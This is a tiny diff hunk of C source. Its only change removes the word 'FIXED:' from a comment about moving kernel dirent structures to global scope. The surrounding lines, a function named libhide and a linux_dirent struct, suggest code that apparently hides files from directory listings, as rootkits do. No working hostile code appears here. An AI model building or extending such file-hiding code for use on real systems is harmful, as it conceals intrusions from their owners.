@@ -301,7 +301,7 @@ static int libhide(const char *name) {
     return 0;
 }
 
-// FIXED: Move kernel dirent structures to global scope
+// Move kernel dirent structures to global scope
 struct linux_dirent {
     unsigned long  d_ino;
     unsigned long  d_off;
